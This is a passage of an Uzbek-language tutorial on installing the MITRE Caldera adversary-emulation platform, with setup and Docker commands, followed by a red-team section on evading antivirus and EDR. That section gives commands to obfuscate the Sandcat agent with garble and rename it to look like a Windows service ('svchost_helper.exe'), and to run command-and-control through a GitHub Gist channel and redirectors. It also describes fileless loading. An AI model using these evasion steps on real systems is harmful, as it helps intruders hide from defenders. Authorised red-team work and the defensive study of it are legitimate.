02-Bo'lim // Amaliy O'rnatish

MITRE Caldera Qanday O'rnatiladi? (Step-by-Step)

Minimal tizim talablari: Linux yoki macOS, Python 3.9+ (3.10/3.11 tavsiya etiladi), NodeJS v18+ (VueJS UI build uchun), Golang 1.19+ (Sandcat agentni kompilatsiya qilish uchun), 8 GB RAM, 2+ CPU.
1. Kerakli paketlar (Python, Go, Node.js) o'rnatish

Sandcat va boshqa agentlar dinamik kompilatsiya bo'lishi uchun golang-go va Caldera v5.0+ ning Magma (Vue3) interfeysini yig'ish uchun nodejs shart.

sudo apt update && sudo apt upgrade -y
sudo apt install -y git python3 python3-pip python3-venv golang-go curl build-essential upx-ucl

# NodeJS 20.x o'rnatish (Caldera v5 Magma UI uchun zarur)
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs
2. Repozitoriyani --recursive bilan klonlash

DIQQAT: --recursive bayrog'ini unutish eng ko'p uchraydigan xatodir! Plaginlar (Sandcat, Stockpile) alohida Git submodule bo'lgani uchun bu bayroqsiz plaginlar bo'sh keladi.

# Barcha plaginlar bilan birga yuklab olish
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

# Agar --recursive unutilgan bo'lsa, quyidagini bajaring:
git submodule update --init --recursive
3. Virtual muhit yaratish va Serverni ishga tushirish

Caldera v5.0 da birinchi marta ishga tushirganda --build bayrog'i berilishi shart — u VueJS frontend va hujjatlarni avtomatik yig'ib beradi.

# Python Virtual Environment yaratish va faollashtirish
python3 -m venv venv
source venv/bin/activate

# Python kutubxonalarini o'rnatish
pip install --upgrade pip
pip install -r requirements.txt

# Birinchi marta ishga tushirish (UI build qilish bilan)
python3 server.py --build

# Keyingi safarlar tez ishga tushirish uchun:
python3 server.py
Web Interfeys Manzili: http://127.0.0.1:8888
Standart Loginlar: red yoki blue / admin
Parolni ko'rish joyi: conf/local.yml (avto-generatsiya qilingan)

Docker orqali Izolyatsiyalangan O'rnatish

Tizimga ortiqcha kutubxonalar o'rnatmasdan, barcha plaginlar va kompilatorlar tayyor bo'lgan konteynerda ishlatish.

# 1. Repozitoriyani klonlash
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

# 2. Docker obrazini yig'ish (Windows agentlarini ham kompilatsiya qilish uchun WIN_BUILD=true)
docker build --build-arg WIN_BUILD=true . -t caldera:server

# 3. Konteynerni portlar bilan ishga tushirish
# 8888 - HTTP/Web UI | 8443 - HTTPS | 7010 - TCP Raw Contact | 7012 - UDP Contact
docker run -d --name mitre_caldera \
  -p 8888:8888 \
  -p 8443:8443 \
  -p 7010:7010 \
  -p 7012:7012/udp \
  caldera:server

# Parol va API kalitlarini logdan ko'rish:
docker logs mitre_caldera | grep -A 15 "users:"

MAXSUS TEXNIK TAHLIL // RED TEAM OPSEC

Qanday Qilib Tizimga "Shovqinsiz" (Stealth) Kira Oladi va Ishlaydi?

Standart Caldera o'rnatilishi bilanoq ishlatilsa, Antivirus/EDR uni darhol ushlaydi. Lekin professional Red Team mutaxassislari Caldera-ni shovqinsiz (Low-Noise / Stealth) rejimga o'tkazish uchun quyidagi 6 ta texnik usulni qo'llaydilar.

!

Nega Standart Caldera "Shovqinli" Hisoblanadi?

  • 1. Statik Signaturalar: Standart sandcat.go ichida "gocat", "54ndc47" va GitHub yo'llari ochiq matnda yozilgan bo'lib, YARA va Defender ularni darhol taniydi.
  • 2. Diskka Fayl Yozish (Dropping to Disk): Standart buyruqda agent C:\Users\Public\splunkd.exe kabi joyga saqlanadi — EDR fayl tizimi skaneri buni tekshiradi.
  • 3. Shubhali HTTP Headerlar: Agent yuklab olishda standart file:sandcat.go va platform:windows HTTP sarlavhalari IDS/Suricata tomonidan ushlanadi.
  • 4. Noisy TTPs (Shovqinli Buyruqlar): Stockpile ichidagi ko'p qobiliyatlar to'g'ridan-to'g'ri cmd.exe /c whoami yoki powershell.exe -enc ishga tushiradi (Sysmon Event ID 1 & 4104).
✓

Shovqinsiz Kirish Uchun 6 Ta OPSEC Texnikasi

  • 1. Garble & Dinamik Kompilyatsiya: Har bir yuklashda Go agentga tasodifiy xesh (-ldflags="-s -w") va garble obfuskatori qo'llab, simvollarni butunlay o'chirish.
  • 2. Fileless / In-Memory Yuklash: Agentni diskka yozmasdan, PowerShell Reflective Loading, Donut shellcode yoki Linuxda memfd_create orqali faqat RAM xotirada ishga tushirish.
  • 3. Yashirin C2 Kanallar (HTTPS / DNS / Gist): Ochiq 8888 port o'rniga Nginx Redirector + Cloudflare CDN (443 HTTPS) yoki GitHub Gist C2 kanalidan foydalanish (trafik faqat api.github.com ga boradi!).
  • 4. High Sleep + Jitter va LOLBins: Beacon vaqtini 300–900 soniyaga va Jitter'ni 20-40% ga qo'yish hamda whoami o'rniga Native API / WMI / LOLBins buyruqlaridan foydalanish.
A) Sandcat Agentni Obfuskatsiya Qilish (AV/EDR Evasion)

Standart Go kompilatori barcha funksiya nomlarini binar ichida qoldiradi. garble va -ldflags="-s -w" yordamida "gocat" satrlarini almashtirib kompilatsiya qilsangiz, statik AV signaturalari butunlay ojiz qoladi:

# 1. Garble Go obfuskatorini o'rnatish
go install mvdan.cc/garble@latest

# 2. Sandcat manba kodidagi standart satrlarni o'zgartirish
cd plugins/sandcat/gocat
find . -type f -name "*.go" -exec sed -i 's/sandcat/winupdate_svc/g' {} +

# 3. Debug ma'lumotlarisiz va literal shifrlash bilan yig'ish (Windows x64 uchun)
GOOS=windows GOARCH=amd64 garble -literals -tiny -seed=random build \
  -ldflags="-s -w -H=windowsgui -X main.key=MaxfiyKalit99" \
  -o ../payloads/svchost_helper.exe sandcat.go
B) Tarmoqda Ko'rinmaslik: GitHub Gist C2 va Nginx Redirector

Nishon korxonada Firewall barcha notanish IP-larni bloklagan bo'lsa ham, api.github.com deyarli har doim ochiq bo'ladi. Sandcat Gist C2 orqali buyruqlarni GitHub'dan o'qib, natijani shu yerga yozadi:

# 1. Caldera local.yml ichida GitHub Tokenni kiritish:
app.contact.gist: GH_PERSONAL_ACCESS_TOKEN_SHU_YERGA

# 2. Agentni HTTP emas, faqat GIST protokoli bilan kompilatsiya qilish:
GOOS=linux GOARCH=amd64 go build \
  -ldflags="-s -w -X main.c2Name=GIST -X main.c2Key=GH_PERSONAL_ACCESS_TOKEN" \
  -o sandcat-gist sandcat.go
